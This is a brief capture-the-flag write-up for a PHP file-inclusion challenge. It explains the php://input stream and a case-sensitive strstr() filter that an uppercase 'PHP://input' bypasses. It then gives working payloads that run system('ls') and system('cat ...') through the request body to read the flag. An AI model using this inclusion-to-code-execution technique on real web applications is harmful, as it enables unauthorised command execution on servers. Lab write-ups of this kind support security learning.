# Web_php_include

![Screenshot from 2021-07-24 21-40-57](https://user-images.githubusercontent.com/87865134/126871958-8e399564-d702-42ee-bdc0-f607b645ebfa.png)

- `php://`
  - Accessing various I/O streams
- `php://input` 
  - is a read-only stream that allows you to read raw data from the request body. php://input is not available with enctype="multipart/form-data"

- Application filter this method by using strstr(): 
  
  `strstr(string $haystack, string $needle, bool $before_needle = false): string|false`
  - This function is case-sensitive. For case-insensitive searches -> can bypass

- Use Burp Repeater to send payload to list all file in current directory:  
  - `?page=PHP://input`
  - in request body: `<?php system('ls'); ?>`    

![Screenshot from 2021-07-24 21-54-28](https://user-images.githubusercontent.com/87865134/126872294-dc57ab31-4be8-41c1-8f92-3d1398a41272.png)

  - >Flag in file fl4gisisish3r3.php

- Send payload to show content of file fl4gisisish3r3.php
  - `?page=PHP://input`
  - in request body: `<?php system('cat fl4gisisish3r3.php'); ?>`

![Screenshot from 2021-07-24 21-57-50](https://user-images.githubusercontent.com/87865134/126872380-91d5eda1-27d6-4c63-944e-da0b4347f66f.png)

- Reference: https://www.php.net/manual/en/wrappers.php.php
